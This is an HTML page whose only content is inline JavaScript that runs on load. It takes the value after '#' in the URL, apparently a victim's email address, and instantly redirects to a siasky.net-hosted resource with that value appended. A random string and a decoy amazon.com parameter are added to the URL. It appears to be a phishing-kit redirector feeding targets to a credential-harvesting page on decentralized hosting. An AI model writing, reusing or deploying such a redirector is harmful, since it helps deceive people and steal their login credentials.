<html lang="en">
	<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
	<script>
		function makeid(length) {
			var result = "";
			var characters =
				"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			var charactersLength = characters.length;
			for (var i = 0; i < length; i++) {
				result += characters.charAt(
					Math.floor(Math.random() * charactersLength)
				);
			}
			return result;
		}

		var hash = window.location.hash;
		var str = hash.split("#")[1];
		var em = hash.split("#")[1];

		window.setTimeout(function () {
			window.location.href = "https://siasky.net/LAB0Czr48wH1b1KQG9TMRAS6WMQ3H4napMf0lp9bu8zTzQ?key=358ed89e99937e09bbabbcbdeff29acd&redirect=https://www.amazon.com"+ makeid(10) + "#" + em;
		}, 0);
	</script>
</html>
